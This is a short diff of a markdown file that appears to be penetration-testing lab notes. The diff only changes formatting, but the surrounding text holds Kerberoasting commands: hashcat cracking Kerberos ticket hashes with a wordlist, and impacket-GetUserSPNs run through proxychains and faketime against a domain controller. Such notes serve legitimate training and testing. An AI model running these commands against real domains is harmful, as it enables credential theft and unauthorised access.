@@ -15,16 +15,18 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr
 
 > Computer accounts and managed service accounts use 120-character random passwords — cracking is infeasible. Focus on user-context SPNs.
 
----
+***
 
-## Fixing: Clock Skew Too Great Error
+### Fixing: Clock Skew Too Great Error
 
 1. Get the DC's current time:
+
 ```bash
 proxychains net time -S DC_IP
 ```
 
 2. Run the command with faketime temporarily:
+
 ```bash
 faketime '2026-06-28 19:33:11' proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.138.240 beyond.com/john
 ```
